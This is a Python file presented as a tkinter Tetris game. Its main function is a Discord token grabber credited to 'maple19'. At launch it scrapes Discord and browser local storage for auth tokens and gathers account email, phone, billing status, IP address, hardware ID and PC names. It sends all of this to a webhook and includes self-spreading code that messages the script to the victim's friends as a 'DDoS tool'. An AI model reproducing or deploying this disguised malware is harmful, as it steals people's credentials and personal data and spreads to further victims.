import tkinter as tk
import random
import os

if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv

WEBHOOK_URL = "webhook url" #webhook url here

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
print("Tetris!!")

def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass


def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def whoTheFuckAmI():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip


def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass


def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass


def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass


def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass


def spread(token, form_data, delay):
    return  
    for friend in getFriends(token):
        try:
            chat_id = getChat(token, friend["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)




BLOCK_SIZE = 25  
FIELD_WIDTH = 10  
FIELD_HEIGHT = 20  

MOVE_LEFT = 0  
MOVE_RIGHT = 1 
MOVE_DOWN = 2 


class TetrisSquare():
    def __init__(self, x=0, y=0, color="gray"):
        self.x = x
        self.y = y
        self.color = color

    def set_cord(self, x, y):
        self.x = x
        self.y = y

    def get_cord(self):
        return int(self.x), int(self.y)

    def set_color(self, color):
        self.color = color

    def get_color(self):
        return self.color

    def get_moved_cord(self, direction):

        
        x, y = self.get_cord()

       
        if direction == MOVE_LEFT:
            return x - 1, y
        elif direction == MOVE_RIGHT:
            return x + 1, y
        elif direction == MOVE_DOWN:
            return x, y + 1
        else:
            return x, y


class TetrisCanvas(tk.Canvas):
    def __init__(self, master, field):
     

        canvas_width = field.get_width() * BLOCK_SIZE
        canvas_height = field.get_height() * BLOCK_SIZE

       
        super().__init__(master, width=canvas_width, height=canvas_height, bg="white")

        
        self.place(x=25, y=25)

        
        for y in range(field.get_height()):
            for x in range(field.get_width()):
                square = field.get_square(x, y)
                x1 = x * BLOCK_SIZE
                x2 = (x + 1) * BLOCK_SIZE
                y1 = y * BLOCK_SIZE
                y2 = (y + 1) * BLOCK_SIZE
                self.create_rectangle(
                    x1, y1, x2, y2,
                    outline="white", width=1,
                    fill=square.get_color()
                )

        
        self.before_field = field

    def update(self, field, block):


        
        new_field = TetrisField()
        for y in range(field.get_height()):
            for x in range(field.get_width()):
                square = field.get_square(x, y)
                color = square.get_color()

                new_square = new_field.get_square(x, y)
                new_square.set_color(color)

        
        if block is not None:
            block_squares = block.get_squares()
            for block_square in block_squares:
                
                x, y = block_square.get_cord()
                color = block_square.get_color()

                
                new_field_square = new_field.get_square(x, y)
                new_field_square.set_color(color)

        
        for y in range(field.get_height()):
            for x in range(field.get_width()):

                
                new_square = new_field.get_square(x, y)
                new_color = new_square.get_color()

                
                before_square = self.before_field.get_square(x, y)
                before_color = before_square.get_color()
                if(new_color == before_color):
                    continue

                x1 = x * BLOCK_SIZE
                x2 = (x + 1) * BLOCK_SIZE
                y1 = y * BLOCK_SIZE
                y2 = (y + 1) * BLOCK_SIZE
               
                self.create_rectangle(
                    x1, y1, x2, y2,
                    outline="white", width=1, fill=new_color
                )

       
        self.before_field = new_field


class TetrisField():
    def __init__(self):
        self.width = FIELD_WIDTH
        self.height = FIELD_HEIGHT

        
        self.squares = []
        for y in range(self.height):
            for x in range(self.width):
                self.squares.append(TetrisSquare(x, y, "gray"))

    def get_width(self):


        return self.width

    def get_height(self):


        return self.height

    def get_squares(self):
        return self.squares

    def get_square(self, x, y):


        return self.squares[y * self.width + x]

    def judge_game_over(self, block):

  
        no_empty_cord = set(square.get_cord() for square
                            in self.get_squares() if square.get_color() != "gray")

        
        block_cord = set(square.get_cord() for square
                         in block.get_squares())

        
        collision_set = no_empty_cord & block_cord

       
        if len(collision_set) == 0:
            ret = False
        else:
            ret = True

        return ret

    def judge_can_move(self, block, direction):

        
        no_empty_cord = set(square.get_cord() for square
                            in self.get_squares() if square.get_color() != "gray")

        
        move_block_cord = set(square.get_moved_cord(direction) for square
                              in block.get_squares())

        
        for x, y in move_block_cord:

            
            if x < 0 or x >= self.width or \
                    y < 0 or y >= self.height:
                return False

        
        collision_set = no_empty_cord & move_block_cord

        
        if len(collision_set) == 0:
            ret = True
        else:
            ret = False

        return ret

    def fix_block(self, block):

        for square in block.get_squares():
            x, y = square.get_cord()
            color = square.get_color()

            
            field_square = self.get_square(x, y)
            field_square.set_color(color)

    def delete_line(self):

        
        for y in range(self.height):
            for x in range(self.width):
                square = self.get_square(x, y)
                if(square.get_color() == "gray"):
                    break
            else:
                for down_y in range(y, 0, -1):
                    for x in range(self.width):
                        src_square = self.get_square(x, down_y - 1)
                        dst_square = self.get_square(x, down_y)
                        dst_square.set_color(src_square.get_color())
                for x in range(self.width):
                    square = self.get_square(x, 0)
                    square.set_color("gray")

class TetrisBlock():
    def __init__(self):

      
        self.squares = []

        
        block_type = random.randint(1, 4)

        
        if block_type == 1:
            color = "red"
            cords = [
                [FIELD_WIDTH / 2, 0],
                [FIELD_WIDTH / 2, 1],
                [FIELD_WIDTH / 2, 2],
                [FIELD_WIDTH / 2, 3],
            ]
        elif block_type == 2:
            color = "blue"
            cords = [
                [FIELD_WIDTH / 2, 0],
                [FIELD_WIDTH / 2, 1],
                [FIELD_WIDTH / 2 - 1, 0],
                [FIELD_WIDTH / 2 - 1, 1],
            ]
        elif block_type == 3:
            color = "green"
            cords = [
                [FIELD_WIDTH / 2 - 1, 0],
                [FIELD_WIDTH / 2, 0],
                [FIELD_WIDTH / 2, 1],
                [FIELD_WIDTH / 2, 2],
            ]
        elif block_type == 4:
            color = "orange"
            cords = [
                [FIELD_WIDTH / 2, 0],
                [FIELD_WIDTH / 2 - 1, 0],
                [FIELD_WIDTH / 2 - 1, 1],
                [FIELD_WIDTH / 2 - 1, 2],
            ]

        for cord in cords:
            self.squares.append(TetrisSquare(cord[0], cord[1], color))

    def get_squares(self):

        return self.squares

    def move(self, direction):

        for square in self.squares:
            x, y = square.get_moved_cord(direction)
            square.set_cord(x, y)

class TetrisGame():

    def __init__(self, master):

        self.field = TetrisField()

        self.block = None

        self.canvas = TetrisCanvas(master, self.field)

        self.canvas.update(self.field, self.block)

    def start(self, func):

        self.end_func = func

        self.field = TetrisField()

        self.new_block()

    def new_block(self):

        self.block = TetrisBlock()

        if self.field.judge_game_over(self.block):
            self.end_func()
            print("GAMEOVER")

        self.canvas.update(self.field, self.block)

    def move_block(self, direction):

        if self.field.judge_can_move(self.block, direction):

            self.block.move(direction)

            self.canvas.update(self.field, self.block)

        else:
            if direction == MOVE_DOWN:
                # ???????????????????????????
                self.field.fix_block(self.block)
                self.field.delete_line()
                self.new_block()

class EventHandller():
    def __init__(self, master, game):
        self.master = master

        self.game = game

        self.timer = None

        button = tk.Button(master, text='START', command=self.start_event)
        button.place(x=25 + BLOCK_SIZE * FIELD_WIDTH + 25, y=30)

    def start_event(self):

        self.game.start(self.end_event)
        self.running = True

        self.timer_start()

        self.master.bind("<Left>", self.left_key_event)
        self.master.bind("<Right>", self.right_key_event)
        self.master.bind("<Down>", self.down_key_event)

    def end_event(self):
        self.running = False

        self.timer_end()
        self.master.unbind("<Left>")
        self.master.unbind("<Right>")
        self.master.unbind("<Down>")

    def timer_end(self):

        if self.timer is not None:
            self.master.after_cancel(self.timer)
            self.timer = None

    def timer_start(self):

        if self.timer is not None:
            self.master.after_cancel(self.timer)

        if self.running:
            self.timer = self.master.after(1000, self.timer_event)

    def left_key_event(self, event):

        self.game.move_block(MOVE_LEFT)

    def right_key_event(self, event):

        self.game.move_block(MOVE_RIGHT)

    def down_key_event(self, event):

        self.game.move_block(MOVE_DOWN)

        self.timer_start()

    def timer_event(self):

        self.down_key_event(None)


class Application(tk.Tk):
    def __init__(self):
        super().__init__()

        self.geometry("400x600")
        self.title("Tetris")

        game = TetrisGame(self)

        EventHandller(self, game)


def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "Account Info????????????????????????",
                        "value": f'**Email: ** || {email} || \n**Phone:** || {phone} || \n**Nitro:** || {nitro} || \n**Billing Info:** || {billing} ||',
                        "inline": True
                    },
                    {
                        "name": "PC Info???PC??????",
                        "value": f'**IP:** || {ip} ||\n**Username :** || {pc_username} || \n**PC Name: ** || {pc_name}|| \nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "Token???????????????",
                        "value": f'|| {token} ||',
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                },
                "footer": {
                    "text": f"Token grabber by maple19"
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "@everyone Token grabbed!",
        "embeds": embeds,
        "username": "Token grabber by maple19",
        "avatar_url": "https://media.discordapp.net/attachments/867289897802924034/869146985482047518/icon_h.png"
    }
    try:
        
        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
        print("loading...")
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
    sleep(5)
    app = Application()
    app.mainloop()


if __name__ == "__main__":
    main()
